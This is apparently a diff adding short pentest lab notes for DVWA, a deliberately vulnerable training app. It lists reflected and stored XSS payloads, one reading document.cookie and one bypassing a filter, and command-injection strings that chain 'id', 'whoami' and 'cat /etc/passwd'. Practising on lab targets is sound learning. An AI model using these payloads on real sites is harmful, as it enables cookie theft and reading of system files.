@@ -19,6 +19,28 @@ We can use this also "http-waf-detect.nse "
 Here Spider will crawl to directories, but sometimes it may miss some endpoints
 The final results will be in Alerts
 ```
+#### DVWA XSS reflect
+```bash
+<script>alert("Hacker")</script>
+# To get cookie value
+<script>alert(document.cookie)</script>
+
+keep severity to Medium (Script will not work)
+use below command
+<img/src/onerror=prompt(1)>
+
+```
+#### XSS stored
+```bash
+same as above
+```
+#### DVWA Command Injection
+```bash
+ip && id
+: whoami
+| uname -a
+: cat /etc/passwd
+```
 #### DVWA
 ```bash
 `| type "path"` (to display content of file - windows)
